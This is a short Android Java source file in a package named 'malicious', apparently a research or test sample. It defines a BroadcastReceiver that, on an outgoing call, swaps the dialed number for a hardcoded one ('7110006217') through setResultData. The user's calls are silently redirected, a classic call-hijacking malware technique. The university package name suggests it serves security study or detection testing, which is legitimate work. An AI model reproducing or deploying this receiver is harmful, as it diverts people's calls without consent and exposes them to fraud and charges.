package edu.ksu.cs.malicious;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;

public class MalOutgoingCallReceiver extends BroadcastReceiver {
    public MalOutgoingCallReceiver() {
    }

    @Override
    public void onReceive(Context context, Intent intent) {

        String phnNm = "7110006217";
        setResultData(phnNm);
    }
}
